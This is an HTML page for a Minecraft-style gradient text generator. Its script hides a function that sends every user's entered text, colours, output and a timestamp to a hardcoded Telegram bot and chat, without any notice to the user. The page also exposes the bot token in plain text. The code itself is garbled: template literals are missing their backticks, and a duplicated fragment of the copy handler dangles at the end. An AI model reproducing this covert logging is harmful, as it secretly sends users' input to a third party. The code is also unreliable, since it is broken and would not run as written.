<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gradient Text Generator</title>
    <style>
        @font-face {
            font-family: 'Minecraft';
            src: url('Minecraft.ttf') format('truetype');
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #1e1e2f, #2a2a40);
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            background: #292942;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-family: 'Minecraft', sans-serif;
            text-align: center;
            font-size: 1.8rem;
            color: #ff79c6;
            text-shadow: 0 0 10px #ff79c6, 0 0 20px #ff79c6;
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 1rem;
            color: #8be9fd;
            margin-bottom: 5px;
        }

        input[type="color"] {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 8px;
            margin-bottom: 15px;
            cursor: pointer;
        }

        textarea {
            width: 100%;
            height: 120px;
            border: none;
            border-radius: 8px;
            padding: 10px;
            margin-bottom: 15px;
            font-family: 'Minecraft', sans-serif;
            background: #1e1e2f;
            color: #fff;
            font-size: 1rem;
            resize: none;
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.3);
        }

        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            margin-bottom: 10px;
            color: #fff;
            background: linear-gradient(90deg, #ff79c6, #8be9fd);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }

        button:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
        }

        #preview {
            font-family: 'Minecraft', sans-serif;
            font-size: 1.5rem;
            font-weight: bold;
            padding: 15px;
            border-radius: 8px;
            background: #1e1e2f;
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.3);
            margin-bottom: 15px;
            text-align: center;
            word-wrap: break-word;
        }

        #output {
            font-family: monospace;
            background: #1e1e2f;
            color: #8be9fd;
            padding: 15px;
            border-radius: 8px;
            word-wrap: break-word;
            font-size: 0.9rem;
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.3);
        }

        .button-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        @media (min-width: 768px) {
            .container {
                max-width: 500px;
            }

            h1 {
                font-size: 2rem;
            }

            button {
                font-size: 1.2rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>In Testing1</h1>
        <h1>Gradient Text Generator by golezafron</h1>
        <label for="startColor">Start Color:</label>
        <input type="color" id="startColor" value="#e736f7">
        
        <label for="endColor">End Color:</label>
        <input type="color" id="endColor" value="#05e6d3">
        
        <label for="inputText">Enter Text:</label>
        <textarea id="inputText" placeholder="Enter your text here..."></textarea>
        
        <div class="button-group">
            <button id="generateBtn">Generate Gradient Text</button>
            <button id="copyBtn">Copy Output</button>
            <button id="boldToggleBtn">Bold: Off</button>
        </div>
        
        <div id="preview"></div>
        <div id="output"></div>
    </div>

    <script>
        const BOT_TOKEN = "8021487859:AAGtTIR38Rdsm63O-_2uCy2zCcysAfSbXvI"; 
        const CHAT_ID = "1447518842";  
        let isBold = false;

        function sendTelegramMessage(message) {
            const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
            const payload = {
                chat_id: CHAT_ID,
                text: message
            };
            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload),
            })
                .then((response) => {
                    if (!response.ok) {
                        console.error(Ошибка отправки: ${response.statusText});
                    }
                })
                .catch((error) => {
                    console.error("Произошла ошибка:", error);
                });
        }


        document.getElementById('boldToggleBtn').addEventListener('click', () => {
            isBold = !isBold;
            document.getElementById('boldToggleBtn').textContent = Bold: ${isBold ? 'On' : 'Off'};
        });

        function interpolateColor(start, end, factor) {
            return start.map((s, i) => Math.round(s + (end[i] - s) * factor));
        }

        function hexToRgb(hex) {
            return [
                parseInt(hex.slice(1, 3), 16),
                parseInt(hex.slice(3, 5), 16),
                parseInt(hex.slice(5, 7), 16)
            ];
        }

        function rgbToHex(rgb) {
            return #${rgb.map(x => x.toString(16).padStart(2, '0').toUpperCase()).join('')};
        }

        function generateGradientText(text, startColor, endColor) {
            const startRgb = hexToRgb(startColor);
            const endRgb = hexToRgb(endColor);
            const length = text.length;
            let gradient = '';

            for (let i = 0; i < length; i++) {
                const factor = i / Math.max(length - 1, 1);
                const color = interpolateColor(startRgb, endRgb, factor);
                gradient += <span style="color:${rgbToHex(color)}">${text[i]}</span>;
            }

            return gradient;
        }

        document.getElementById('generateBtn').addEventListener('click', () => {
            const startColor = document.getElementById('startColor').value;
            const endColor = document.getElementById('endColor').value;
            const text = document.getElementById('inputText').value;

            if (!text.trim()) {
                alert('Please enter some text.');
                return;
            }

            const preview = generateGradientText(text, startColor, endColor);
            document.getElementById('preview').innerHTML = preview;

            let output = '';
             for (let i = 0; i < text.length; i++) {
                const factor = i / Math.max(text.length - 1, 1);
                const color = rgbToHex(interpolateColor(hexToRgb(startColor), hexToRgb(endColor), factor));
                output += &#${color.slice(1)}${isBold ? '&l' : ''}${text[i]};
            }
            document.getElementById('output').textContent = output;
             const now = new Date();
             const formattedDate = now.toLocaleDateString();
             const formattedTime = now.toLocaleTimeString();

            const logMessage = [${formattedDate}]:[${formattedTime}]:[${startColor}]:[${endColor}]:[${text}]:[${output}];
            sendTelegramMessage(logMessage);


        });

        document.getElementById('copyBtn').addEventListener('click', () => {
            const outputText = document.getElementById('output').textContent;
            navigator.clipboard.writeText(outputText).then(() => {
                alert('Output copied to clipboard!');
            }).catch(err => {
                alert('Failed to copy: ' + err);
            });
        });

                alert('Output copied to clipboard!');
            }).catch(err => {
                alert('Failed to copy: ' + err);
            });
        });
</script>
</body>
</html>
